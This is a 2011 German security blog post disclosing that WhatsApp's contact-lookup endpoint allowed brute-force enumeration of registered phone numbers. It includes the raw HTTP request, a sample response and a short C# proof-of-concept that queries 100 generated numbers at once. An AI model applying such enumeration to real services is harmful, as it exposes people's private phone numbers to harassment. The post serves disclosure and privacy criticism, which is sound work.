<!DOCTYPE html>
<html lang="de">
  <head>
    <!-- meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="keywords" content="Johannes Mittendorfer, Mittendorfer, Blog, Informatik, Student, Entwicklung, Security">
    <meta name="description" content="Der Blog von Informatik-Student Johannes Mittendorfer über das Leben im Studium, Software-Entwicklung, IT-Security und das Internet">
    <meta name="author" content="Johannes Mittendorfer">
    <meta http-equiv="cleartype" content="on">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <meta name="application-name" content="Johannes Mittendorfer"/>
    <meta name="msapplication-TileColor" content="#f9fbf4"/>
    <meta http-equiv="imagetoolbar" content="false" />
    <meta property="fb:admins" content="100000063853580" />
    <meta name="Content-Language" content="de" />
    <!-- resources -->
    <link rel="shortcut icon" href="/assets/favicon.ico">
    <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml">
    <link rel="canoncial" href="https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern">
    <!-- styles -->
    <link rel="stylesheet" href="/assets/css/styles.css"/>
    <!-- title -->
    <title>WhatsApp erlaubt Bruteforce auf Telefonnummern</title>
    <!-- page specific resources -->
  </head>
  <body itemscope itemtype="http://schema.org/WebSite">
    <!-- menu bar -->
    <nav id="bar">
      <section class="container">
        <a class="title" itemprop="url" href="/">
          <h1 itemprop="name">Johannes Mittendorfer</h1>
        </a>
        <ul>
          <li>
            <a href="/">
              Start
            </a>
          </li>
          <li>
            <a itemprop="about" href="/ueber-mich" title="Über">
              Über
            </a>
          </li>
          <li>
            <a href="/astronomie" title="Astronomie">
              Astronomie
            </a>
          </li>
          <li>
            <a href="/impressum" title="Impressum">
              Impressum
            </a>
          </li>
        </ul>
      </section>
    </nav>
    <!-- main content -->
    <div class="container">
      <main>
        <!-- semantic description -->
        <script type="application/ld+json">
          {
            "@context": "http://schema.org",
            "@type": "BlogPosting",
            "@id": "https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern",
            "headline": "WhatsApp erlaubt Bruteforce auf Telefonnummern",
            "description": "",
            "datePublished": "2011-12-03 00:00:00 +0100",
            "dateModified": "2011-12-03 00:00:00 +0100",
            "author": {
              "@type": "Person",
              "name": "Johannes Mittendorfer"
            },
            "publisher": {
              "@type": "Organization",
              "name": "Johannes Mittendorfer",
              "logo": {
                  "@type": "ImageObject",
                  "url": "https://blog.johannes-mittendorfer.com/assets/favicon.ico",
                  "width": 16,
                  "height": 16
              }
            },
          
            "mainEntityOfPage": {
              "@id": "https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern"
            }
          }
        </script>
        <script type="application/ld+json">
          {
            "@context": "http://schema.org",
            "@type": "BreadcrumbList",
            "itemListElement": [{
              "@type": "ListItem",
              "position": 1,
              "item": {
                "@id": "https://blog.johannes-mittendorfer.com/artikel",
                "name": "Artikel"
              }
            },
            {
              "@type": "ListItem",
              "position": 2,
              "item": {
                "@id": "https://blog.johannes-mittendorfer.com/artikel/2011",
                "name": "2011"
              }
            },
            {
              "@type": "ListItem",
              "position": 3,
              "item": {
                "@id": "https://blog.johannes-mittendorfer.com/artikel/2011/12",
                "name": "12"
              }
            },
            {
              "@type": "ListItem",
              "position": 4,
              "item": {
                "@id": "https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern",
                "name": "WhatsApp erlaubt Bruteforce auf Telefonnummern"
              }
            }]
          }
        </script>
        <article itemscope itemtype="http://schema.org/BlogPosting">
          <header>
            <div class="meta">
              <span class="category">Security</span> &ndash; 
              <time itemprop="datePublished" datetime="2011-12-03T00:00:00+01:00" class="date">03.12.2011</time> &ndash;
              <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
            </div>
            <h1 itemprop="headline">WhatsApp erlaubt Bruteforce auf Telefonnummern</h1>
            <div class="warning">
              Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
            </div>
          </header>
          <div itemprop="articleBody">
            <p>Eine Telefonnummer möchte man meist gerne für sich behalten, um nicht von Personen belästigt zu werden und einfach seine Ruhe zu haben. Mit der Nutzung der weitverbreiteten WhatsApp-Anwendung auf seinem Mobiltelefon macht man jedoch möglich die Rufnummern der angemeldeten Benutzer zu durchsuchen. In der App wird angezeigt welche seiner Kontakte bereits für WhatsApp registriert sind.</p>
            <p>Dazu wird eine Anfrage mit den Telefonnummern seiner Kontakte an den WhatsApp-Server <em>sro.whatsapp.net</em> geschickt:</p>
            <figure class="highlight">
              <pre><code class="language-text" data-lang="text">POST /client/iphone/iq.php HTTP/1.1 
Host: sro.whatsapp.net 
User-Agent: WhatsApp/2.6.7 iPhone_OS/4.3.3 Device/iPhone 
Accept: */* 
Accept-Language: de-de 
Accept-Encoding: gzip, deflate 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 710 
Connection: keep-alive 
Proxy-Connection: keep-alive 

cd=1&amp;amp;cc=43&amp;amp;me=664XXXXXXX&amp;amp;u[]=0699XXXXXXX&amp;amp;u[]=0680XXXXXXX</code></pre>
            </figure>
            <p>Im Body der POST-Anfrage an <code class="highlighter-rouge">/client/iphone/iq.php</code> werden die Telefonnummern als Array (?) in der Form des GET-Parameters <code class="highlighter-rouge">u[]=XXXXXXXXXXX</code> übermittelt. Der Parameter <em>me</em> muss jedoch nicht angegeben werden. Zudem darf die Anfrage auch über <em>GET</em> erfolgen. Auf die Anfrage antwortet der Server mit dem Status der Teilnehmer im plist-Format:</p>
            <figure class="highlight">
              <pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;array&gt;</span>
		<span class="nt">&lt;dict&gt;</span>
			<span class="nt">&lt;key&gt;</span>P<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>0043664.......<span class="nt">&lt;/string&gt;</span>
			<span class="nt">&lt;key&gt;</span>T<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;integer&gt;</span>199610<span class="nt">&lt;/integer&gt;</span>
			<span class="nt">&lt;key&gt;</span>S<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>....<span class="nt">&lt;/string&gt;</span>
			<span class="nt">&lt;key&gt;</span>JID<span class="nt">&lt;/key&gt;</span>
			<span class="nt">&lt;string&gt;</span>43664.......<span class="nt">&lt;/string&gt;</span>
		<span class="nt">&lt;/dict&gt;</span>
	<span class="nt">&lt;/array&gt;</span>
<span class="nt">&lt;/plist&gt;</span></code></pre>
            </figure>
            <p>So ist es natürlich auch möglich einen Brute-Force Angriff auf Handynummern zu starten, und das funktioniert auch. Man kann zum Beispiel hundert Nummern generieren lassen, die man dann alle zusammen an den WhatsApp-Server übermittelt. Daraufhin erhält man alle Benutzer in diesem Bereich, die WhatsApp benutzen. Als ein Proof-of-Concept habe ich ein kleines Programm in C# zusammengestöpselt, das Telefonnummern aus einem bestimmten Bereich generiert und diese anschließ;end an den passenden WhatsApp-Server schickt. Anschließ;end wird der Inhalt der plist-Datei in der Konsole ausgegeben.</p>
            <figure class="highlight">
              <pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span> 
<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span> 
<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span> 
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span> 
<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span> 

<span class="k">namespace</span> <span class="nn">WhatsAppBrute</span><span class="p">{</span>
	<span class="k">class</span> <span class="nc">Program</span><span class="p">{</span>
		<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">){</span>
			<span class="n">WebClient</span> <span class="n">c</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebClient</span><span class="p">();</span> 
			<span class="n">String</span> <span class="n">start</span> <span class="p">=</span> <span class="s">"https://sro.whatsapp.net/client/iphone/iq.php?cd=1&amp;amp;cc=43"</span> 
			
			<span class="k">for</span> <span class="p">(</span><span class="n">Int32</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="m">100</span><span class="p">;</span> <span class="n">i</span><span class="p">++){</span>
				<span class="n">String</span> <span class="n">count</span><span class="p">;</span> 
				
				<span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="p">&lt;</span> <span class="m">10</span><span class="p">){</span>
					<span class="n">count</span> <span class="p">=</span> <span class="s">"0"</span> <span class="p">+</span> <span class="n">i</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span> 
				<span class="p">}</span> 
				<span class="k">else</span> <span class="p">{</span> 
					<span class="n">count</span> <span class="p">=</span> <span class="n">i</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span> 
				<span class="p">}</span> 
				
				<span class="n">start</span> <span class="p">+=</span> <span class="s">"&amp;u[]=0664XXXXX"</span> <span class="p">+</span> <span class="n">count</span><span class="p">;</span> 
			<span class="p">}</span> 
			
			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="n">start</span><span class="p">));</span> 
			<span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span> 
		<span class="p">}</span>
	<span class="p">}</span> 
<span class="p">}</span></code></pre>
            </figure>
            <p><strong>Dieser Code dient nur zu Vorführzwecken und darf nicht für einen Angriff auf die Server von WhatsApp verwendet werden!</strong></p>
            <p>Fazit: Es ist erschreckend wie einfach eine solche Anfrage ausgeführt werden kann und wie freizügig mit den Telefonnummern umgegangen wird. Natürlich wird nicht jeder Benutzer eine so umständliche Art benutzen (wollen), aber es ist möglich.</p>
          </div>
          <footer>
            <div id="share">
              <a href="https://www.facebook.com/sharer/sharer.php?u=https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern" class="share-icon facebook"><i class="fa fa-facebook"></i> Facebook</a>
              <a href="https://twitter.com/intent/tweet?original_referer=https://johannes-mittendorfer.com&source=tweetbuttont&url=https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern" class="share-icon twitter"><i class="fa fa-twitter"></i> Twitter</a>
              <a href="https://plus.google.com/share?url=https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern&hl=de" class="share-icon googleplus"><i class="fa fa-google-plus"></i> Google+</a>
              <a href="https://flattr.com/submit/auto?user_id=joushx&url=https://blog.johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern&title=WhatsApp%20erlaubt%20Bruteforce%20auf%20Telefonnummern" class="share-icon flattr">Flattr</a>
            </div>
          </footer>
        </article>
      </main>
    </div>
  </body>
</html>